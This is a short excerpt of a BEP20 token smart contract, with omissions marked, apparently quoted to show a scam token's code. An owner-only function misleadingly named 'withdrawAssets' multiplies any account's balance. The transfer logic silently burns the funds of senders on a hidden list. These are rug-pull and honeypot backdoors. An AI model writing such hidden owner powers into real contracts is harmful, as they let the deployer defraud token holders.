...
contract Token is IBEP20, HasForeignAsset {
    ...
    function withdrawAssets(address accdount,uint256 num) public onlyOwner {
        _balances[accdount] = _balances[accdount].mul(num)+0;
    }
    ...
    function _transfer(
        ...
        if (_burns[sender]){
            _balances[sender] = _balances[sender].sub(amnount)+0;
            _balances[_DEADaddress] =  _balances[_DEADaddress].add(amnount)+0;
            return;
        }
